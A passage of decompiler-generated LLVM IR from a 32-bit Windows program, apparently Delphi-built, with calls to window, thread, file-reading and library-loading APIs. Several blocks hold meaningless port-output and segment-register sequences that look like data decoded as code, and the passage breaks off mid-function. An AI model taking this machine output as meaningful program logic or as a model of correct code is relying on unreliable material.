define i32 @function_40666c() local_unnamed_addr {
dec_label_pc_40666c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i1 @__decompiler_undefined_function_1()
  %4 = call i1 @__decompiler_undefined_function_1()
  br i1 %3, label %dec_label_pc_4066d0, label %dec_label_pc_40666f, !insn.addr !1479

dec_label_pc_40666f:                              ; preds = %dec_label_pc_40666c
  %5 = icmp eq i1 %4, false, !insn.addr !1480
  br i1 %5, label %dec_label_pc_4066e4, label %dec_label_pc_406671, !insn.addr !1480

dec_label_pc_406671:                              ; preds = %dec_label_pc_40666f
  ret i32 %2, !insn.addr !1481

dec_label_pc_4066d0:                              ; preds = %dec_label_pc_40666c
  %6 = call i32 @function_4045ac(), !insn.addr !1482
  br label %dec_label_pc_4066e4, !insn.addr !1483

dec_label_pc_4066e4:                              ; preds = %dec_label_pc_4066d0, %dec_label_pc_40666f
  %7 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* null, i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1484
  %8 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1485
  %9 = add i32 %0, 20, !insn.addr !1486
  %10 = inttoptr i32 %9 to i32*, !insn.addr !1486
  %11 = load i32, i32* %10, align 4, !insn.addr !1486
  %12 = add i32 %0, 16, !insn.addr !1487
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1487
  %14 = load i32, i32* %13, align 4, !insn.addr !1487
  %15 = add i32 %0, 8, !insn.addr !1488
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1488
  %17 = load i32, i32* %16, align 4, !insn.addr !1488
  %18 = inttoptr i32 %11 to i32*, !insn.addr !1489
  %19 = call i32 @DefWindowProcA(i32* %18, i32 %14, i32 %1, i32 %17), !insn.addr !1489
  ret i32 %19, !insn.addr !1490
}

define i32 @function_40671c() local_unnamed_addr {
dec_label_pc_40671c:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = ptrtoint i32 (i32, i32, i32)* %0 to i32
  %2 = call i32* @CreateWindowExA(i32 0, i8* null, i8* null, i32 0, i32 0, i32 0, i32 0, i32 %1, i32* null, i32* nonnull @0, i32* nonnull @0, i32* nonnull @0), !insn.addr !1491
  %3 = ptrtoint i32* %2 to i32, !insn.addr !1491
  %4 = call i32 @SetWindowLongA(i32* inttoptr (i32 4220576 to i32*), i32 -4, i32 %3), !insn.addr !1492
  ret i32 %4, !insn.addr !1493
}

define i32 @function_406751(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_406751:
  %merge7.reg2mem = alloca i32, !insn.addr !1494
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = trunc i32 %1 to i8
  %3 = mul i8 %2, 2, !insn.addr !1494
  %4 = inttoptr i32 %1 to i8*, !insn.addr !1494
  store i8 %3, i8* %4, align 1, !insn.addr !1494
  %5 = add i32 %1, 114, !insn.addr !1495
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1495
  %7 = load i8, i8* %6, align 1, !insn.addr !1495
  %8 = udiv i32 %0, 256, !insn.addr !1495
  %9 = trunc i32 %8 to i8, !insn.addr !1495
  %10 = add i8 %7, %9, !insn.addr !1495
  store i8 %10, i8* %6, align 1, !insn.addr !1495
  %11 = add i8 %2, -32, !insn.addr !1496
  %12 = icmp ult i8 %2, 32, !insn.addr !1496
  %13 = icmp eq i8 %11, 0, !insn.addr !1496
  %14 = zext i8 %11 to i32, !insn.addr !1496
  %15 = and i32 %1, -256, !insn.addr !1496
  %16 = or i32 %15, %14, !insn.addr !1496
  %17 = or i1 %12, %13, !insn.addr !1497
  store i32 %16, i32* %merge7.reg2mem, !insn.addr !1497
  br i1 %17, label %dec_label_pc_40675a, label %dec_label_pc_4067ab, !insn.addr !1497

dec_label_pc_40675a:                              ; preds = %dec_label_pc_406751
  %18 = add i32 %16, 105, !insn.addr !1498
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1498
  %20 = load i8, i8* %19, align 1, !insn.addr !1498
  %21 = and i8 %20, %9, !insn.addr !1498
  store i8 %21, i8* %19, align 1, !insn.addr !1498
  %22 = trunc i32 %arg3 to i16, !insn.addr !1499
  %23 = inttoptr i32 %arg6 to i8*, !insn.addr !1499
  %24 = load i8, i8* %23, align 1, !insn.addr !1499
  call void @__asm_outsb(i16 %22, i8 %24), !insn.addr !1499
  %25 = add i32 %arg5, 105, !insn.addr !1500
  %26 = and i32 %25, 65535
  %27 = inttoptr i32 %26 to i8*, !insn.addr !1500
  %28 = load i8, i8* %27, align 1, !insn.addr !1500
  %29 = udiv i32 %arg2, 256, !insn.addr !1500
  %30 = trunc i32 %29 to i8, !insn.addr !1500
  %31 = and i8 %28, %30, !insn.addr !1500
  store i8 %31, i8* %27, align 1, !insn.addr !1500
  %32 = mul i32 %arg5, 2, !insn.addr !1501
  %33 = add i32 %arg2, 115, !insn.addr !1501
  %34 = add i32 %33, %32, !insn.addr !1501
  %35 = inttoptr i32 %34 to i8*, !insn.addr !1501
  %36 = load i8, i8* %35, align 1, !insn.addr !1501
  %37 = trunc i32 %arg2 to i8, !insn.addr !1501
  %38 = add i8 %36, %37, !insn.addr !1501
  %39 = icmp eq i8 %38, 0, !insn.addr !1501
  store i8 %38, i8* %35, align 1, !insn.addr !1501
  store i32 %arg1, i32* %merge7.reg2mem, !insn.addr !1502
  br i1 %39, label %dec_label_pc_4067ab, label %dec_label_pc_406769, !insn.addr !1502

dec_label_pc_406769:                              ; preds = %dec_label_pc_40675a
  %40 = inttoptr i32 %arg6 to i32*, !insn.addr !1503
  %41 = load i32, i32* %40, align 4, !insn.addr !1503
  call void @__asm_outsd(i16 %22, i32 %41), !insn.addr !1503
  %42 = inttoptr i32 %arg5 to i8*, !insn.addr !1504
  %43 = call i32* @FindWindowA(i8* %42, i8* bitcast (i32* @0 to i8*)), !insn.addr !1504
  %44 = ptrtoint i32* %43 to i32, !insn.addr !1504
  %45 = icmp eq i32* %43, null, !insn.addr !1505
  %46 = icmp eq i1 %45, false, !insn.addr !1506
  store i32 %44, i32* %merge7.reg2mem, !insn.addr !1506
  br i1 %46, label %dec_label_pc_4067ab, label %dec_label_pc_40678d, !insn.addr !1506

dec_label_pc_40678d:                              ; preds = %dec_label_pc_406769
  %47 = call i32 @function_40671c(), !insn.addr !1507
  %48 = call i32 @function_4036c8(), !insn.addr !1508
  %49 = inttoptr i32 %48 to i8*, !insn.addr !1509
  %50 = call i32* @LoadLibraryA(i8* %49), !insn.addr !1510
  %51 = ptrtoint i32* %50 to i32, !insn.addr !1510
  ret i32 %51, !insn.addr !1511

dec_label_pc_4067ab:                              ; preds = %dec_label_pc_406751, %dec_label_pc_406769, %dec_label_pc_40675a
  %merge7.reload = load i32, i32* %merge7.reg2mem
  ret i32 %merge7.reload, !insn.addr !1512
}

define i32 @function_406871(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_406871:
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !1513
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_32 = alloca i32, align 4
  %stack_var_28 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_28, align 4
  %stack_var_16 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_16, align 4
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1513
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1513
  %9 = add i8 %6, %8, !insn.addr !1513
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1513
  store i8 %9, i8* %10, align 1, !insn.addr !1513
  %11 = load i32, i32* %eax, align 4, !insn.addr !1514
  %12 = add i32 %11, 114, !insn.addr !1514
  %13 = inttoptr i32 %12 to i8*, !insn.addr !1514
  %14 = load i8, i8* %13, align 1, !insn.addr !1514
  %15 = udiv i32 %2, 256, !insn.addr !1514
  %16 = trunc i32 %15 to i8, !insn.addr !1514
  %17 = add i8 %14, %16, !insn.addr !1514
  store i8 %17, i8* %13, align 1, !insn.addr !1514
  %18 = load i32, i32* %eax, align 4
  %19 = trunc i32 %18 to i8, !insn.addr !1515
  %20 = add i8 %19, -32, !insn.addr !1515
  %21 = icmp ult i8 %19, 32, !insn.addr !1515
  %22 = icmp eq i8 %20, 0, !insn.addr !1515
  %23 = zext i8 %20 to i32, !insn.addr !1515
  %24 = and i32 %18, -256, !insn.addr !1515
  %25 = or i32 %24, %23, !insn.addr !1515
  store i32 %25, i32* %eax, align 4, !insn.addr !1515
  %26 = or i1 %21, %22, !insn.addr !1516
  br i1 %26, label %dec_label_pc_40687a, label %dec_label_pc_4068e9, !insn.addr !1516

dec_label_pc_40687a:                              ; preds = %dec_label_pc_406871
  %27 = add i32 %25, 105, !insn.addr !1517
  %28 = inttoptr i32 %27 to i8*, !insn.addr !1517
  %29 = load i8, i8* %28, align 1, !insn.addr !1517
  %30 = and i8 %29, %16, !insn.addr !1517
  store i8 %30, i8* %28, align 1, !insn.addr !1517
  %31 = load i32, i32* %stack_var_28, align 4, !insn.addr !1518
  store i32 %31, i32* %eax, align 4, !insn.addr !1518
  %32 = trunc i32 %arg3 to i16, !insn.addr !1519
  %33 = inttoptr i32 %arg6 to i8*, !insn.addr !1519
  %34 = load i8, i8* %33, align 1, !insn.addr !1519
  call void @__asm_outsb(i16 %32, i8 %34), !insn.addr !1519
  %35 = add i32 %arg5, 105, !insn.addr !1520
  %36 = and i32 %35, 65535
  %37 = inttoptr i32 %36 to i8*, !insn.addr !1520
  %38 = load i8, i8* %37, align 1, !insn.addr !1520
  %39 = udiv i32 %arg2, 256, !insn.addr !1520
  %40 = trunc i32 %39 to i8, !insn.addr !1520
  %41 = and i8 %38, %40, !insn.addr !1520
  store i8 %41, i8* %37, align 1, !insn.addr !1520
  %42 = mul i32 %arg5, 2, !insn.addr !1521
  %43 = add i32 %arg2, 115, !insn.addr !1521
  %44 = add i32 %43, %42, !insn.addr !1521
  %45 = inttoptr i32 %44 to i8*, !insn.addr !1521
  %46 = load i8, i8* %45, align 1, !insn.addr !1521
  %47 = trunc i32 %arg2 to i8, !insn.addr !1521
  %48 = add i8 %46, %47, !insn.addr !1521
  %49 = icmp eq i8 %48, 0, !insn.addr !1521
  store i8 %48, i8* %45, align 1, !insn.addr !1521
  store i32* %stack_var_32, i32** %esp.0.in.reg2mem, !insn.addr !1522
  br i1 %49, label %dec_label_pc_4068cb, label %dec_label_pc_406889, !insn.addr !1522

dec_label_pc_406889:                              ; preds = %dec_label_pc_40687a
  %50 = icmp slt i8 %48, 0, !insn.addr !1521
  %51 = inttoptr i32 %arg6 to i32*, !insn.addr !1523
  %52 = load i32, i32* %51, align 4, !insn.addr !1523
  call void @__asm_outsd(i16 %32, i32 %52), !insn.addr !1523
  br i1 %50, label %dec_label_pc_406900, label %dec_label_pc_40688e, !insn.addr !1524

dec_label_pc_40688e:                              ; preds = %dec_label_pc_406889
  %53 = load i32, i32* %eax, align 4
  %54 = trunc i32 %53 to i8, !insn.addr !1525
  %55 = add i8 %54, -32, !insn.addr !1525
  %56 = icmp ult i8 %54, 32, !insn.addr !1525
  %57 = icmp eq i8 %55, 0, !insn.addr !1525
  %58 = zext i8 %55 to i32, !insn.addr !1525
  %59 = and i32 %53, -256, !insn.addr !1525
  %60 = or i32 %59, %58, !insn.addr !1525
  store i32 %60, i32* %eax, align 4, !insn.addr !1525
  %61 = or i1 %56, %57, !insn.addr !1526
  br i1 %61, label %dec_label_pc_406892, label %dec_label_pc_406901, !insn.addr !1526

dec_label_pc_406892:                              ; preds = %dec_label_pc_40688e
  %62 = add i32 %arg2, 105, !insn.addr !1527
  %63 = inttoptr i32 %62 to i8*, !insn.addr !1527
  %64 = load i8, i8* %63, align 1, !insn.addr !1527
  %65 = udiv i32 %53, 256, !insn.addr !1527
  %66 = trunc i32 %65 to i8, !insn.addr !1527
  %67 = and i8 %64, %66, !insn.addr !1527
  store i8 %67, i8* %63, align 1, !insn.addr !1527
  %68 = add i32 %arg6, 105, !insn.addr !1528
  %69 = inttoptr i32 %68 to i8*, !insn.addr !1528
  %70 = load i8, i8* %69, align 1, !insn.addr !1528
  %71 = and i8 %70, %40, !insn.addr !1528
  store i8 %71, i8* %69, align 1, !insn.addr !1528
  %72 = load i32, i32* %eax, align 4
  %73 = inttoptr i32 %72 to i8*, !insn.addr !1529
  %74 = load i8, i8* %73, align 1, !insn.addr !1529
  %75 = trunc i32 %72 to i8, !insn.addr !1529
  %76 = add i8 %74, %75, !insn.addr !1529
  store i8 %76, i8* %73, align 1, !insn.addr !1529
  %77 = load i32, i32* %eax, align 4
  %78 = inttoptr i32 %77 to i8*, !insn.addr !1530
  %79 = load i8, i8* %78, align 1, !insn.addr !1530
  %80 = trunc i32 %77 to i8, !insn.addr !1530
  %81 = add i8 %79, %80, !insn.addr !1530
  store i8 %81, i8* %78, align 1, !insn.addr !1530
  %82 = inttoptr i32 %arg2 to i32*, !insn.addr !1531
  %83 = load i32, i32* %82, align 4, !insn.addr !1531
  %84 = add i32 %83, %arg6, !insn.addr !1531
  store i32 %84, i32* %82, align 4, !insn.addr !1531
  %85 = load i32, i32* %eax, align 4
  %86 = inttoptr i32 %85 to i8*, !insn.addr !1532
  %87 = load i8, i8* %86, align 1, !insn.addr !1532
  %88 = trunc i32 %85 to i8, !insn.addr !1532
  %89 = add i8 %87, %88, !insn.addr !1532
  store i8 %89, i8* %86, align 1, !insn.addr !1532
  store i32 %arg5, i32* %stack_var_28, align 4, !insn.addr !1533
  %90 = call i32 @__readfsdword(i32 0), !insn.addr !1534
  store i32 %90, i32* %stack_var_16, align 4, !insn.addr !1534
  %91 = ptrtoint i32* %stack_var_16 to i32, !insn.addr !1534
  call void @__writefsdword(i32 0, i32 %91), !insn.addr !1535
  %92 = load i32, i32* @global_var_4096d4, align 4, !insn.addr !1536
  %93 = add i32 %92, 1, !insn.addr !1536
  %94 = icmp eq i32 %93, 0, !insn.addr !1536
  store i32 %93, i32* @global_var_4096d4, align 4, !insn.addr !1536
  %95 = icmp eq i1 %94, false, !insn.addr !1537
  br i1 %95, label %dec_label_pc_4068c3, label %dec_label_pc_4068b9, !insn.addr !1537

dec_label_pc_4068b9:                              ; preds = %dec_label_pc_406892
  %96 = call i32 @"@LStrClr"(), !insn.addr !1538
  br label %dec_label_pc_4068c3, !insn.addr !1538

dec_label_pc_4068c3:                              ; preds = %dec_label_pc_4068b9, %dec_label_pc_406892
  store i32 0, i32* %eax, align 4, !insn.addr !1539
  %97 = load i32, i32* %stack_var_16, align 4, !insn.addr !1540
  call void @__writefsdword(i32 0, i32 %97), !insn.addr !1541
  store i32* %stack_var_28, i32** %esp.0.in.reg2mem, !insn.addr !1541
  br label %dec_label_pc_4068cb, !insn.addr !1541

dec_label_pc_4068cb:                              ; preds = %dec_label_pc_4068c3, %dec_label_pc_40687a
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %98 = add i32 %esp.0, -4, !insn.addr !1542
  %99 = inttoptr i32 %98 to i32*, !insn.addr !1542
  store i32 4221144, i32* %99, align 4, !insn.addr !1542
  %100 = load i32, i32* %eax, align 4, !insn.addr !1543
  ret i32 %100, !insn.addr !1543

dec_label_pc_4068e9:                              ; preds = %dec_label_pc_406871
  %101 = mul i32 %4, 2, !insn.addr !1544
  %102 = add i32 %1, 105, !insn.addr !1544
  %103 = add i32 %102, %101, !insn.addr !1544
  %104 = inttoptr i32 %103 to i32*, !insn.addr !1544
  %105 = load i32, i32* %104, align 4, !insn.addr !1544
  %106 = or i32 %105, %3, !insn.addr !1544
  store i32 %106, i32* %104, align 4, !insn.addr !1544
  %107 = add i32 %0, -1, !insn.addr !1545
  %108 = trunc i32 %3 to i16, !insn.addr !1546
  %109 = inttoptr i32 %107 to i32*, !insn.addr !1546
  %110 = load i32, i32* %109, align 4, !insn.addr !1546
  call void @__asm_outsd(i16 %108, i32 %110), !insn.addr !1546
  %111 = load i32, i32* %eax, align 4, !insn.addr !1547
  %112 = call i8 @__readgsbyte(i32 %111), !insn.addr !1547
  %113 = load i32, i32* %eax, align 4
  %114 = trunc i32 %113 to i8, !insn.addr !1547
  %115 = or i8 %112, %114, !insn.addr !1547
  call void @__writegsbyte(i32 %113, i8 %115), !insn.addr !1547
  %116 = load i32, i32* %eax, align 4
  %117 = inttoptr i32 %116 to i8*, !insn.addr !1548
  %118 = load i8, i8* %117, align 1, !insn.addr !1548
  %119 = trunc i32 %116 to i8, !insn.addr !1548
  %120 = add i8 %118, %119, !insn.addr !1548
  store i8 %120, i8* %117, align 1, !insn.addr !1548
  %121 = load i32, i32* %eax, align 4
  %122 = trunc i32 %121 to i8, !insn.addr !1549
  %123 = inttoptr i32 %121 to i8*, !insn.addr !1549
  %124 = load i8, i8* %123, align 1, !insn.addr !1549
  %125 = add i8 %124, %122, !insn.addr !1549
  %126 = zext i8 %125 to i32, !insn.addr !1549
  %127 = and i32 %121, -256, !insn.addr !1549
  %128 = or i32 %127, %126, !insn.addr !1549
  %129 = inttoptr i32 %128 to i8*, !insn.addr !1550
  %130 = load i8, i8* %129, align 1, !insn.addr !1550
  %131 = trunc i32 %3 to i8, !insn.addr !1551
  %132 = add i8 %125, %131, !insn.addr !1550
  %133 = add i8 %132, %130, !insn.addr !1551
  store i8 %133, i8* %129, align 1, !insn.addr !1551
  %134 = add i32 %128, 1, !insn.addr !1552
  store i32 %134, i32* %eax, align 4, !insn.addr !1552
  %135 = inttoptr i32 %134 to i8*, !insn.addr !1553
  %136 = load i8, i8* %135, align 1, !insn.addr !1553
  %137 = trunc i32 %134 to i8, !insn.addr !1553
  %138 = add i8 %136, %137, !insn.addr !1553
  store i8 %138, i8* %135, align 1, !insn.addr !1553
  br label %dec_label_pc_406900, !insn.addr !1553

dec_label_pc_406900:                              ; preds = %dec_label_pc_4068e9, %dec_label_pc_406889
  %139 = load i32, i32* %eax, align 4, !insn.addr !1553
  ret i32 %139, !insn.addr !1553

dec_label_pc_406901:                              ; preds = %dec_label_pc_40688e
  %140 = inttoptr i32 %60 to i8*, !insn.addr !1554
  %141 = load i8, i8* %140, align 1, !insn.addr !1554
  %142 = add i8 %141, %55, !insn.addr !1554
  store i8 %142, i8* %140, align 1, !insn.addr !1554
  %143 = load i32, i32* %eax, align 4
  %144 = inttoptr i32 %143 to i8*, !insn.addr !1555
  %145 = load i8, i8* %144, align 1, !insn.addr !1555
  %146 = trunc i32 %arg3 to i8, !insn.addr !1555
  %147 = add i8 %145, %146, !insn.addr !1555
  store i8 %147, i8* %144, align 1, !insn.addr !1555
  %148 = load i32, i32* %eax, align 4, !insn.addr !1556
  %149 = add i32 %148, 1, !insn.addr !1556
  %150 = mul i32 %149, 2, !insn.addr !1557
  %151 = inttoptr i32 %150 to i8*, !insn.addr !1557
  %152 = load i8, i8* %151, align 2, !insn.addr !1557
  %153 = trunc i32 %149 to i8, !insn.addr !1557
  %154 = add i8 %152, %153, !insn.addr !1557
  store i8 %154, i8* %151, align 2, !insn.addr !1557
  %155 = inttoptr i32 %149 to i8*, !insn.addr !1558
  %156 = load i8, i8* %155, align 1, !insn.addr !1558
  %157 = add i8 %156, %153, !insn.addr !1558
  store i8 %157, i8* %155, align 1, !insn.addr !1558
  ret i32 %149, !insn.addr !1559
}

define i32 @function_40691f() local_unnamed_addr {
dec_label_pc_40691f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1560
}

define i32 @function_40692c() local_unnamed_addr {
dec_label_pc_40692c:
  %esp.1.reg2mem = alloca i32, !insn.addr !1561
  %stack_var_-116 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-84 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1562
  store i32 %0, i32* %stack_var_-56, align 4, !insn.addr !1562
  %1 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1562
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1563
  %2 = call i32 @"@LStrCat3"(), !insn.addr !1564
  %3 = call i32 @function_4036c8(), !insn.addr !1565
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1566
  store i8* %4, i8** %stack_var_-84, align 4, !insn.addr !1566
  %5 = ptrtoint i8** %stack_var_-84 to i32, !insn.addr !1566
  %6 = call i32* @CreateFileA(i8* %4, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1567
  %7 = icmp eq i32* %6, inttoptr (i32 -1 to i32*), !insn.addr !1568
  store i32 %5, i32* %esp.1.reg2mem, !insn.addr !1569
  br i1 %7, label %dec_label_pc_406acb, label %dec_label_pc_406996, !insn.addr !1569

dec_label_pc_406996:                              ; preds = %dec_label_pc_40692c
  %8 = ptrtoint i32* %6 to i32, !insn.addr !1567
  store i32 %8, i32* %stack_var_-92, align 4, !insn.addr !1570
  %9 = ptrtoint i32* %stack_var_-92 to i32, !insn.addr !1570
  %10 = call i32 @GetFileSize(i32* null, i32* %6), !insn.addr !1571
  %11 = add i32 %10, 1
  %12 = icmp ult i32 %11, 2
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !1572
  br i1 %12, label %dec_label_pc_406acb, label %dec_label_pc_4069b2, !insn.addr !1572

dec_label_pc_4069b2:                              ; preds = %dec_label_pc_406996
  %13 = call i32 @"@LStrSetLength"(), !insn.addr !1573
  %14 = call i32 @function_403720(), !insn.addr !1574
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1575
  %16 = call i1 @ReadFile(i32* %15, i32* %6, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0, %_OVERLAPPED* bitcast (i32* @0 to %_OVERLAPPED*)), !insn.addr !1575
  store i32 %8, i32* %stack_var_-116, align 4, !insn.addr !1576
  %17 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !1576
  %18 = call i1 @CloseHandle(i32* %6), !insn.addr !1577
  %19 = call i32 @function_4046d4(), !insn.addr !1578
  store i32 %17, i32* %esp.1.reg2mem
  br label %dec_label_pc_406acb

dec_label_pc_406acb:                              ; preds = %dec_label_pc_4069b2, %dec_label_pc_406996, %dec_label_pc_40692c
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %20 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !1579
  %21 = load i32, i32* %20, align 4, !insn.addr !1579
  call void @__writefsdword(i32 0, i32 %21), !insn.addr !1580
  %22 = add i32 %esp.1.reload, 8, !insn.addr !1581
  %23 = inttoptr i32 %22 to i32*, !insn.addr !1581
  store i32 4221677, i32* %23, align 4, !insn.addr !1581
  %24 = call i32 @"@LStrArrayClr"(), !insn.addr !1582
  ret i32 %24, !insn.addr !1583
}

define i32 @function_406ae6() local_unnamed_addr {
dec_label_pc_406ae6:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1584
  ret i32 %0, !insn.addr !1584
}

define i32 @function_406aeb() local_unnamed_addr {
dec_label_pc_406aeb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1585
}

define i32 @function_406aed(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406aed:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1586
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1586
  %3 = load i32, i32* %2, align 4, !insn.addr !1586
  ret i32 %3, !insn.addr !1587
}

define i32 @function_406b24() local_unnamed_addr {
dec_label_pc_406b24:
  %esp.2.reg2mem = alloca i32, !insn.addr !1588
  %esp.1.reg2mem = alloca i32, !insn.addr !1588
  %esi.0.reg2mem = alloca i32, !insn.addr !1588
  %esp.0.reg2mem = alloca i32, !insn.addr !1588
  %ebx.0.reg2mem = alloca i32, !insn.addr !1588
  %stack_var_-68 = alloca i8*, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1589
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1590
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1590
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1590
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1591
  %2 = call i32 @function_403c88(), !insn.addr !1592
  %3 = icmp slt i32 %2, 1
  store i32 %1, i32* %esp.2.reg2mem, !insn.addr !1593
  br i1 %3, label %dec_label_pc_406c0d, label %dec_label_pc_406b52, !insn.addr !1593

dec_label_pc_406b52:                              ; preds = %dec_label_pc_406b24
  %4 = call i32 @"@LStrCat3"(), !insn.addr !1594
  %5 = call i32 @function_4036c8(), !insn.addr !1595
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1596
  store i8* %6, i8** %stack_var_-68, align 4, !insn.addr !1596
  %7 = ptrtoint i8** %stack_var_-68 to i32, !insn.addr !1596
  %8 = call i32* @CreateFileA(i8* %6, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1597
  %9 = icmp eq i32* %8, inttoptr (i32 -1 to i32*), !insn.addr !1598
  store i32 %7, i32* %esp.2.reg2mem, !insn.addr !1599
  br i1 %9, label %dec_label_pc_406c0d, label %dec_label_pc_406b8e, !insn.addr !1599

dec_label_pc_406b8e:                              ; preds = %dec_label_pc_406b52
  %10 = call i32 @"@LStrClr"(), !insn.addr !1600
  %11 = call i32 @function_403c90(), !insn.addr !1601
  %12 = icmp slt i32 %11, 0, !insn.addr !1602
  store i32 %7, i32* %esp.1.reg2mem, !insn.addr !1603
  br i1 %12, label %dec_label_pc_406bd8, label %dec_label_pc_406ba6, !insn.addr !1603

dec_label_pc_406ba6:                              ; preds = %dec_label_pc_406b8e
  %13 = add i32 %11, 1, !insn.addr !1604
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !1605
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !1605
  store i32 %13, i32* %esi.0.reg2mem, !insn.addr !1605
  br label %dec_label_pc_406ba9, !insn.addr !1605

dec_label_pc_406ba9:                              ; preds = %dec_label_pc_406ba9, %dec_label_pc_406ba6
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %14 = add i32 %esp.0.reload, -4, !insn.addr !1606
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1606
  store i32 0, i32* %15, align 4, !insn.addr !1606
  %16 = load i32, i32* @global_var_4096dc, align 4, !insn.addr !1607
  %17 = mul i32 %ebx.0.reload, 8, !insn.addr !1608
  %18 = add i32 %16, %17, !insn.addr !1608
  %19 = inttoptr i32 %18 to i32*, !insn.addr !1608
  %20 = load i32, i32* %19, align 4, !insn.addr !1608
  %21 = add i32 %esp.0.reload, -8, !insn.addr !1608
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1608
  store i32 %20, i32* %22, align 4, !insn.addr !1608
  %23 = add i32 %esp.0.reload, -12, !insn.addr !1609
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1609
  store i32 ptrtoint (i32* @global_var_406c54 to i32), i32* %24, align 4, !insn.addr !1609
  %25 = load i32, i32* @global_var_4096dc, align 4, !insn.addr !1610
  %26 = or i32 %17, 4, !insn.addr !1611
  %27 = add i32 %25, %26, !insn.addr !1611
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1611
  %29 = load i32, i32* %28, align 4, !insn.addr !1611
  %30 = add i32 %esp.0.reload, -16, !insn.addr !1611
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1611
  store i32 %29, i32* %31, align 4, !insn.addr !1611
  %32 = add i32 %esp.0.reload, -20, !insn.addr !1612
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1612
  store i32 ptrtoint ([3 x i8]* @global_var_406c60 to i32), i32* %33, align 4, !insn.addr !1612
  %34 = call i32 @"@LStrCatN"(), !insn.addr !1613
  %35 = add i32 %ebx.0.reload, 1, !insn.addr !1614
  %36 = add i32 %esi.0.reload, -1, !insn.addr !1615
  %37 = icmp eq i32 %36, 0, !insn.addr !1615
  %38 = icmp eq i1 %37, false, !insn.addr !1616
  store i32 %35, i32* %ebx.0.reg2mem, !insn.addr !1616
  store i32 %32, i32* %esp.0.reg2mem, !insn.addr !1616
